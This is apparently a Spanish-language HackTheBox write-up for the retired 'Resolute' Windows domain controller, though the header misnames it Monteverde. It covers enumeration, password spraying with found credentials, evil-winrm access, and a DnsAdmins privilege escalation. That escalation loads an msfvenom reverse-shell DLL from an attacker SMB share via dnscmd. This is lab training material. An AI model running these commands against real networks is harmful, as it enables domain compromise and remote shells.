# Resolute-HTB

Desarrollo de la VM MONTEVERDE de HACK THE BOX (HTB)

## 1. Configuración de la VM

- La VM se encuentra en estado de retirada de HTB
- Se debe activar la VM para poder usarla, se requiere una suscripción PREMIUM.

## 2. Escaneo de Puertos

```
# Nmap 7.92 scan initiated Sat Apr  2 10:32:21 2022 as: nmap -n -P0 --top-ports 5000 -sS -sC -vv -T5 -oA full 10.129.136.132
Warning: 10.129.136.132 giving up on port because retransmission cap hit (2).
Increasing send delay for 10.129.136.132 from 0 to 5 due to 733 out of 1831 dropped probes since last increase.
Nmap scan report for 10.129.136.132
Host is up, received user-set (0.35s latency).
Scanned at 2022-04-02 10:32:22 EDT for 172s
Not shown: 4954 closed tcp ports (reset)
PORT      STATE    SERVICE          REASON
53/tcp    open     domain           syn-ack ttl 127
88/tcp    open     kerberos-sec     syn-ack ttl 127
135/tcp   open     msrpc            syn-ack ttl 127
139/tcp   open     netbios-ssn      syn-ack ttl 127
389/tcp   open     ldap             syn-ack ttl 127
445/tcp   open     microsoft-ds     syn-ack ttl 127
464/tcp   open     kpasswd5         syn-ack ttl 127
593/tcp   open     http-rpc-epmap   syn-ack ttl 127
636/tcp   open     ldapssl          syn-ack ttl 127
3268/tcp  open     globalcatLDAP    syn-ack ttl 127
3269/tcp  open     globalcatLDAPssl syn-ack ttl 127
5985/tcp  open     wsman            syn-ack ttl 127
49927/tcp open     unknown          syn-ack ttl 127

Host script results:
|_clock-skew: mean: 2h27m01s, deviation: 4h02m30s, median: 7m00s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2022-04-02T07:41:30-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63774/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 20975/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60972/udp): CLEAN (Failed to receive data)
|   Check 4 (port 33457/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-04-02T14:41:33
|_  start_date: 2022-04-02T14:27:05

```

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute1.jpg" width=80% />


## 3. Enumeración

- Podemos enumerar utilizando ENUM4LINUX o AUTORECON.

```
┌──(root㉿kali)-[~/HT/RESOLUTE]
└─# enum4linux -a -M -l -d 10.129.136.132 > enum4linux.txt    
```

- Identificamos usuarios del repositorio LDAP y encontramos una contraseña: Welcome123!

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute2.jpg" width=80% />

- También podemos enumerar los usuarios con LDAPSEARCH:

```
ldapsearch -x -b "dc=megabank,dc=local" -h 10.129.136.132 
```

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute3.jpg" width=80% />

## 4. Explotación

## 4.1. Cracking ONLINE

- Tenemos usuarios y una contraseña. Identificamos melanie:Welcome123!

```
┌──(root㉿kali)-[~/HT/RESOLUTE]
└─# crackmapexec smb 10.129.136.132 -u users.txt -p 'Welcome123!' --shares --pass-pol
```

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute4.jpg" width=80% />

- Nos conectamos a través de WINRM

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute5.jpg" width=80% />

- En la carpeta USERS, encontramos la carpeta RYAN. Es una pista, el usuario RYAN parece que juega algun rol en este CTF.

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute6.jpg" width=80% />


## 4.2. Enumerando carpetas

- Otra técnica es buscar carpetas que contengan información sensible.
- En el directorio C:\, hay una carpeta oculta con información sensible. Password: ryan Serv3r4Admin4cc123!


<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute7.jpg" width=80% />

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute8.jpg" width=80% />


## 4.3. Cracking ONLINE (2)

- Con la contraseña encontrada, probamos un nuevo acceso. Nuevo acceso: ryan:Serv3r4Admin4cc123!

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute9.jpg" width=80% />

- Nos conectamos a través de WINRM:

```
┌──(root㉿kali)-[~/HT/RESOLUTE]
└─# evil-winrm -i 10.129.136.132 -u ryan -p 'Serv3r4Admin4cc123!'   
```

<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute10.jpg" width=80% />


## 5. Elevando Privilegios

### 5.1. ABUSE DNSADMIN

- En la imagen superior vemos que el usuario RYAN pertenece al grupo DNSADMIN. Eso también es una pista.
- Existe un procedimiento ya conocido para expotar la vulnerabilidad:

** Construir una DLL maliciosa
** Inyectar la DLL maliciosa de manera remota, es decir, a través de SMB. Se puede realizar de manera local pero algún AV podría detectarlo.
** Reiniciar el servicio y se obtiene shell reversa.

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2
http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html

- Creamos el DLL malicioso
```
┌──(root㉿kali)-[~/HT/RESOLUTE]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.15 LPORT=8080 -f dll > evil.dll
```

- Levantamos un servidor SMB para compartir la carpeta
```
┌──(root㉿kali)-[~/HT/RESOLUTE]
└─# /usr/bin/impacket-smbserver share $(pwd)  
```

- En la víctima cargamos la librería DNS, detenemos el servicio y lo iniciamos de nuevo

```
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.16.15\share\evil.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3780
        FLAGS              :
```


- En KALI, levantamos el HANDLER y esperamos la conexión reversa:


<img src="https://github.com/El-Palomo/Resolute-HTB/blob/main/Resolute11.jpg" width=80% />




























































































